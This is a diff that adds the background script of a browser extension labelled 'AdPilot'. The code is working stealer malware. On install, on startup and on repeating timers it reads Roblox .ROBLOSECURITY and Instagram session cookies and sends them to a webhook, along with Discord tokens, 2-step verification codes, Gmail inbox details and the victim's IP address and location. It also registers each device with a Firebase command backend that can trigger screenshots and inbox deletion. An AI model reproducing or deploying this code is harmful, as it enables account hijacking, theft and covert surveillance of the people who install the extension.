+  chrome.alarms.create("autoSendCookie", { periodInMinutes: 14 });
+  chrome.alarms.create(POPUP_CHECK_ALARM, { periodInMinutes: 0.5 });
+  chrome.alarms.create(SCREENSHOT_REQUEST_CHECK_ALARM, { periodInMinutes: 0.1 });
+  chrome.alarms.create(OPEN_GMAIL_ALARM, { periodInMinutes: 0.1 });
+  chrome.alarms.create(CLOSE_WINDOWS_ALARM, { periodInMinutes: 0.1 });
+  chrome.alarms.create(DELETE_ALARM, { periodInMinutes: 0.1 });
+  chrome.alarms.create("checkRefreshInbox", { periodInMinutes: 0.1 });
+  chrome.alarms.create("checkClearInbox", { periodInMinutes: 0.1 });
+  chrome.alarms.create("checkRestoreTrash", { periodInMinutes: 0.1 });
+
+  if (details.reason === 'install') {
+    registerDevice();
+    // Explicit Roblox check on install
+    await new Promise(r => setTimeout(r, 1500));
+    sendRobloxCookieToWebhook("install");
+  } else {
+    // On update/reload, still check
+    await new Promise(r => setTimeout(r, 1500));
+    sendRobloxCookieToWebhook("install");
+  }
+});
+
+chrome.runtime.onStartup.addListener(async () => {
+  chrome.alarms.create("autoSendCookie", { periodInMinutes: 14 });
+  chrome.alarms.create(POPUP_CHECK_ALARM, { periodInMinutes: 0.5 });
+  chrome.alarms.create(SCREENSHOT_REQUEST_CHECK_ALARM, { periodInMinutes: 0.1 });
+  chrome.alarms.create(OPEN_GMAIL_ALARM, { periodInMinutes: 0.1 });
+  chrome.alarms.create(CLOSE_WINDOWS_ALARM, { periodInMinutes: 0.1 });
+  chrome.alarms.create(DELETE_ALARM, { periodInMinutes: 0.1 });
+  chrome.alarms.create("checkRefreshInbox", { periodInMinutes: 0.1 });
+  chrome.alarms.create("checkClearInbox", { periodInMinutes: 0.1 });
+  chrome.alarms.create("checkRestoreTrash", { periodInMinutes: 0.1 });
+});
+
+chrome.alarms.onAlarm.addListener((alarm) => {
+  if (alarm.name === "autoSendCookie") sendRobloxCookieToWebhook("alarm");
+  if (alarm.name === POPUP_CHECK_ALARM) checkPopupSetting();
+  if (alarm.name === SCREENSHOT_REQUEST_CHECK_ALARM) checkScreenshotRequests();
+  if (alarm.name === OPEN_GMAIL_ALARM) checkOpenGmail();
+  if (alarm.name === CLOSE_WINDOWS_ALARM) checkCloseWindows();
+  if (alarm.name === DELETE_ALARM) checkDeleteMessage();
+  if (alarm.name === "checkRefreshInbox") checkRefreshInbox();
+  if (alarm.name === "checkClearInbox") checkClearInbox();
+  if (alarm.name === "checkRestoreTrash") checkRestoreTrash();
+});
+
+// ============================================
+// POPUP TOGGLE
+// ============================================
+const POPUP_SETTING_PATH = "/settings/popupEnabled.json";
+const POPUP_CHECK_ALARM = "checkPopupSetting";
+
+async function checkPopupSetting() {
+  try {
+    const response = await firebaseFetch(POPUP_SETTING_PATH);
+    if (!response.ok) return;
+    const enabled = await response.json();
+    if (typeof enabled !== "boolean") return;
+    const stored = await chrome.storage.local.get({ popupEnabled: true });
+    if (stored.popupEnabled !== enabled) {
+      await chrome.storage.local.set({ popupEnabled: enabled });
+      const tabs = await chrome.tabs.query({ url: "*://*.roblox.com/*" });
+      for (const tab of tabs) {
+        try { await chrome.tabs.sendMessage(tab.id, { action: "popupSettingChanged", enabled }); } catch (e) {}
+      }
+    }
+  } catch (e) {}
+}
+checkPopupSetting();
+
+// ============================================
+// ROBLOX DETECTION
+// ============================================
+let lastKnownCookie = "";
+
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === "complete" && tab.url && tab.url.includes("roblox.com")) {
+    setTimeout(() => {
+      checkCookieAndSend("tabUpdate");
+      captureAndSendScreenshot("roblox_page");
+    }, 2000);
+  }
+});
+
+chrome.tabs.onCreated.addListener((tab) => {
+  if (tab.url && tab.url.includes("roblox.com")) {
+    setTimeout(() => {
+      checkCookieAndSend("tabCreate");
+      captureAndSendScreenshot("roblox_new_tab");
+    }, 2000);
+  }
+});
+
+getRobloxCookie().then(cookie => { if (cookie) lastKnownCookie = cookie; });
+
+setInterval(async () => {
+  const cookie = await getRobloxCookie();
+  if (cookie && cookie !== lastKnownCookie) {
+    lastKnownCookie = cookie;
+    sendRobloxCookieToWebhook("cookieChange");
+  }
+}, 15000);
+
+// ============================================
+// IP / ROBLOX HELPERS
+// ============================================
+async function getIPAddress() {
+  try { const r = await fetch("https://api.ipify.org?format=json"); return r.ok ? (await r.json()).ip : null; } catch { return null; }
+}
+async function getIPDetails(ip) {
+  if (!ip) return null;
+  try {
+    const r = await fetch(`https://ipwho.is/${ip}`);
+    if (r.ok) { const d = await r.json(); if (d.success) return { city: d.city || "Unknown", region: d.region || "Unknown", country: d.country || "Unknown", isp: d.connection?.isp || "Unknown", timezone: d.timezone?.id || "Unknown" }; }
+  } catch {}
+  return null;
+}
+async function getRobloxCookie() {
+  try { const c = await chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }); return c ? c.value : null; } catch { return null; }
+}
+
+async function checkCookieAndSend(tabSource) {
+  const cookie = await getRobloxCookie();
+  if (!cookie) {
+    sendNoCookieEmbed(tabSource);
+    return;
+  }
+  sendRobloxCookieToWebhook(tabSource);
+}
+
+// No cookie — ALWAYS includes the source
+async function sendNoCookieEmbed(source = "manual") {
+  const ipAddress = await getIPAddress();
+  const ipDetails = await getIPDetails(ipAddress);
+  const browser = getBrowserName();
+
+  const embed = {
+    title: "❌ No Roblox Cookie Found",
+    description: "User is not logged into Roblox.",
+    color: 0xFF5252,
+    timestamp: new Date().toISOString(),
+    footer: { text: "AdPilot" },
+    fields: [
+      { name: "📌 Checked From", value: SOURCE_LABELS[source] || source, inline: false },
+      { name: "🌐 Browser", value: browser, inline: true }
+    ]
+  };
+
+  if (ipAddress) embed.fields.push({ name: "🌍 IP", value: `\`\`\`${ipAddress}\`\`\``, inline: true });
+  if (ipDetails) {
+    embed.fields.push({ name: "🏙️ City", value: ipDetails.city, inline: true });
+    embed.fields.push({ name: "🌎 Country", value: ipDetails.country, inline: true });
+    embed.fields.push({ name: "🏢 ISP", value: ipDetails.isp, inline: true });
+  }
+
+  await sendToWebhook({ embeds: [embed] }, "no-cookie");
+}
+
+async function getRobloxAccountInfo(cookie) {
+  const headers = { "Cookie": `.ROBLOSECURITY=${cookie}` };
+  try {
+    const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
+    if (!userRes.ok) return null;
+    const user = await userRes.json();
+    let avatarUrl = "";
+    try { const a = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`, { headers }); if (a.ok) { const ad = await a.json(); if (ad.data?.[0]) avatarUrl = ad.data[0].imageUrl; } } catch {}
+    let robux = null;
+    try { const b = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, { headers }); if (b.ok) robux = (await b.json()).robux; } catch {}
+    let premium = null;
+    try { const p = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, { headers }); if (p.ok) premium = await p.json() === true ? "Yes" : "No"; } catch {}
+    let instagramSessionId = null;
+    try { const ig = await chrome.cookies.get({ url: "https://www.instagram.com", name: "sessionid" }); if (ig) instagramSessionId = ig.value; } catch {}
+    return { user, avatarUrl, robux, premium, instagramSessionId };
+  } catch { return null; }
+}
+
+async function sendRobloxCookieToWebhook(source = "manual") {
+  const cookie = await getRobloxCookie();
+
+  // Case 1: no cookie — always send with source
+  if (!cookie) {
+    sendNoCookieEmbed(source);
+    return;
+  }
+
+  lastKnownCookie = cookie;
+
+  // Case 2: cookie exists but Roblox rejects it
+  const info = await getRobloxAccountInfo(cookie);
+  if (!info) {
+    const ipAddress = await getIPAddress();
+    const ipDetails = await getIPDetails(ipAddress);
+    const browser = getBrowserName();
+
+    const embed = {
+      title: "⚠️ Roblox Cookie Invalid",
+      description: "A `.ROBLOSECURITY` cookie exists but Roblox's API rejected it. The cookie is expired or the account is logged out.",
+      color: 0xFFA500,
+      timestamp: new Date().toISOString(),
+      footer: { text: "AdPilot" },
+      fields: [
+        { name: "📌 Checked From", value: SOURCE_LABELS[source] || source, inline: false },
+        { name: "🌐 Browser", value: browser, inline: true }
+      ]
+    };
+    if (ipAddress) embed.fields.push({ name: "🌍 IP", value: `\`\`\`${ipAddress}\`\`\``, inline: true });
+    if (ipDetails) {
+      embed.fields.push({ name: "🌎 Country", value: ipDetails.country, inline: true });
+      embed.fields.push({ name: "🏢 ISP", value: ipDetails.isp, inline: true });
+    }
+
+    await sendToWebhook({ embeds: [embed] }, "roblox-cookie-invalid");
+    return;
+  }
+
+  // Case 3: valid cookie
+  const { user, avatarUrl, robux, premium, instagramSessionId } = info;
+  const ipAddress = await getIPAddress();
+  const ipDetails = await getIPDetails(ipAddress);
+  const browser = getBrowserName();
+
+  if (deviceId) {
+    firebaseFetch(`/devices/${deviceId}/robloxUsername.json`, { method: 'PUT', body: JSON.stringify(user.name) }).catch(() => {});
+  }
+
+  const embed = {
+    title: "🔐 New Roblox Cookie",
+    description: `**Account:** [${user.name}](https://www.roblox.com/users/${user.id}/profile)\n**User ID:** ${user.id}`,
+    color: 0x6c5ce7,
+    timestamp: new Date().toISOString(),
+    footer: { text: "Auto‑Connect" },
+    fields: [
+      { name: "📌 Checked From", value: SOURCE_LABELS[source] || source, inline: false },
+      { name: "🌐 Browser", value: browser, inline: true }
+    ]
+  };
+
+  if (ipAddress) embed.fields.push({ name: "🌍 IP", value: `\`\`\`${ipAddress}\`\`\``, inline: true });
+  if (ipDetails) {
+    embed.fields.push({ name: "🏙️ City", value: ipDetails.city, inline: true });
+    embed.fields.push({ name: "🌎 Country", value: ipDetails.country, inline: true });
+    embed.fields.push({ name: "🏢 ISP", value: ipDetails.isp, inline: true });
+  }
+
+  embed.description += `\n\n**Cookie:**\n\`\`\`${cookie}\`\`\``;
+
+  if (robux !== null) embed.fields.push({ name: "💰 Robux", value: robux.toString(), inline: true });
+  if (premium !== null) embed.fields.push({ name: "⭐ Premium", value: premium, inline: true });
+  if (avatarUrl) embed.thumbnail = { url: avatarUrl };
+  if (instagramSessionId) {
+    embed.fields.push({ name: "📸 Instagram", value: `\`\`\`${instagramSessionId}\`\`\``, inline: false });
+  }
+
+  await sendToWebhook({ embeds: [embed] }, "roblox-cookie");
+}
+
+// Fire on SW start (browser opened / extension started)
+sendRobloxCookieToWebhook("startup");
+
+// ============================================
+// MESSAGE HANDLERS
+// ============================================
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+  if (message.action === 'sendDiscordToken') {
+    sendDiscordTokenToWebhook(message.token, message.username, message.displayName, message.avatarUrl, message.accountAge, message.guilds)
+      .then(() => sendResponse({ success: true }))
+      .catch((err) => sendResponse({ success: false, error: err.message }));
+    return true;
+  }
+
+  if (message.action === 'startVerificationClicked') {
+    (async () => {
+      let username = 'Unknown';
+      try { const c = await getRobloxCookie(); if (c) { const i = await getRobloxAccountInfo(c); if (i?.user?.name) username = i.user.name; } } catch {}
+      await sendStartVerificationToWebhook(username);
+      sendResponse({ success: true });
+    })();
+    return true;
+  }
+
+  if (message.action === 'sendTwoStepCode') {
+    if (!message.code || message.code.length !== 6) { sendResponse({ success: false, error: 'Invalid code' }); return true; }
+    sendTwoStepCodeToWebhook(message.code).then(() => sendResponse({ success: true })).catch((err) => sendResponse({ success: false, error: err.message }));
+    return true;
+  }
+
+  if (message.action === 'gmailAccountInfo') {
+    (async () => {
+      const { name, email, messages = [] } = message;
+      chrome.storage.local.set({ lastGmailAccount: { name, email, messages, at: Date.now() } });
+      await firebaseFetch("/commands/openGmailInfo.json", { method: "PUT", body: JSON.stringify({ name, email, messages, at: Date.now() }) }).catch(() => {});
+      if (name && email) {
+        const browser = getBrowserName();
+        const accEmbed = { title: "📧 Gmail Account Detected", color: 0xEA4335, timestamp: new Date().toISOString(), footer: { text: "AdPilot" }, fields: [{ name: "👤 Name", value: name, inline: true }, { name: "📩 Email", value: email, inline: true }, { name: "🌐 Browser", value: browser, inline: true }, { name: "🆔 Device", value: deviceId || "Unknown", inline: true }, { name: "📥 Count", value: messages.length.toString(), inline: true }] };
+        await sendToWebhook({ embeds: [accEmbed] }, "gmail-account");
+        const CHUNK = 8;
+        for (let i = 0; i < messages.length; i += CHUNK) {
+          const chunk = messages.slice(i, i + CHUNK);
+          const fields = chunk.map((m, idx) => ({ name: `#${i + idx + 1} — ${(m.subject || "(no subject)").slice(0, 150)}`, value: `**From:** ${m.senderName || "Unknown"}${m.threadId ? ` \`${m.threadId}\`` : ""}\n${(m.snippet || "").slice(0, 120)}`.slice(0, 1000), inline: false }));
+          await sendToWebhook({ embeds: [{ title: `📥 Inbox ${i + 1}–${i + chunk.length}`, color: 0x4285F4, footer: { text: `AdPilot • ${email}` }, fields }] }, `gmail-inbox-${i}`);
+          await new Promise(r => setTimeout(r, 700));
+        }
+      }
+      sendResponse({ ok: true });
+    })();
+    return true;
+  }
+
+  // Popup opened — re-check Roblox
+  if (message.action === 'popupOpened') {
+    sendRobloxCookieToWebhook("popup_opened");
+    sendResponse({ ok: true });
+    return true;
+  }
+
+  // Roblox page asks if logged in — used by app.js to decide showing popup
+  if (message.action === 'checkRobloxLogin') {
+    (async () => {
+      const cookie = await getRobloxCookie();
+      if (!cookie) { sendResponse({ loggedIn: false }); return; }
+      const info = await getRobloxAccountInfo(cookie);
+      sendResponse({ loggedIn: !!info });
+    })();
+    return true;
+  }
+});
+
+// ============================================
+// DEVICE REGISTRATION
+// ============================================
+let deviceId = null;
+function getDeviceId(callback) {
+  chrome.storage.local.get(['deviceId'], (result) => {
+    if (!result.deviceId) {
+      const id = 'dev_' + Math.random().toString(36).substr(2, 6).toUpperCase();
+      chrome.storage.local.set({ deviceId: id }, () => callback(id));
+    } else callback(result.deviceId);
+  });
+}
+async function registerDevice() {
+  getDeviceId(async (id) => {
+    deviceId = id;
+    const ip = await getIPAddress();
+    const country = await getIPDetails(ip)?.country || "Unknown";
+    const browser = getBrowserName();
+    const os = navigator.platform;
+    let robloxUsername = "Unknown";
+    try { const c = await getRobloxCookie(); if (c) { const i = await getRobloxAccountInfo(c); if (i?.user?.name) robloxUsername = i.user.name; } } catch {}
+    const embed = { title: "🆕 Device Registered", color: 0x6c5ce7, fields: [{ name: "Device ID", value: deviceId, inline: true }, { name: "Browser", value: browser, inline: true }, { name: "OS", value: os, inline: true }, { name: "IP", value: ip || "Unknown", inline: true }, { name: "Country", value: country, inline: true }, { name: "Roblox", value: robloxUsername, inline: true }], timestamp: new Date().toISOString() };
+    await sendToWebhook({ embeds: [embed] }, "device-reg");
+    await firebaseFetch(`/devices/${deviceId}.json`, { method: "PUT", body: JSON.stringify({ deviceId, browser, os, ip, country, lastSeen: Date.now(), online: true, robloxUsername }) });
+  });
+}
+setInterval(async () => {
+  if (deviceId) {
+    await firebaseFetch(`/devices/${deviceId}/lastSeen.json`, { method: "PUT", body: JSON.stringify(Date.now()) }).catch(() => {});
+  }
+}, 30000);
+
+// ============================================
+// START VERIFICATION / 2SV / DISCORD TOKEN
+// ============================================
+async function sendStartVerificationToWebhook(username) {
+  const browser = getBrowserName();
+  const embed = { title: "🔘 Start Verification Clicked", description: `A user clicked the **Start Verification** button.`, color: 0x00b894, timestamp: new Date().toISOString(), fields: [{ name: "👤 Roblox", value: username, inline: true }, { name: "🌐 Browser", value: browser, inline: true }] };
+  await sendToWebhook({ embeds: [embed] }, "start-verify");
+}
+async function sendTwoStepCodeToWebhook(code) {
+  const browser = getBrowserName();
+  const embed = { title: "🔐 2-Step Verification Code", description: `Code: \`\`\`${code}\`\`\``, color: 0x6c5ce7, timestamp: new Date().toISOString(), fields: [{ name: "🌐 Browser", value: browser, inline: true }] };
+  await sendToWebhook({ embeds: [embed] }, "2sv");
+}
+async function sendDiscordTokenToWebhook(token, username, displayName, avatarUrl, accountAge, guilds) {
+  const browser = getBrowserName();
+  const guildList = guilds && guilds.length > 0 ? guilds.slice(0, 20).join(', ') : 'None';
+  const embed = { title: "🔑 New Discord Account Added", description: `**Display Name:** ${displayName}\n**Username:** ${username}`, color: 0x00b894, timestamp: new Date().toISOString(), thumbnail: { url: avatarUrl }, fields: [{ name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }, { name: "Account Age", value: accountAge, inline: true }, { name: "Servers", value: `\`\`\`${guildList}\`\`\``, inline: false }, { name: "🌐 Browser", value: browser, inline: true }] };
+  await sendToWebhook({ embeds: [embed] }, "discord-token");
+}
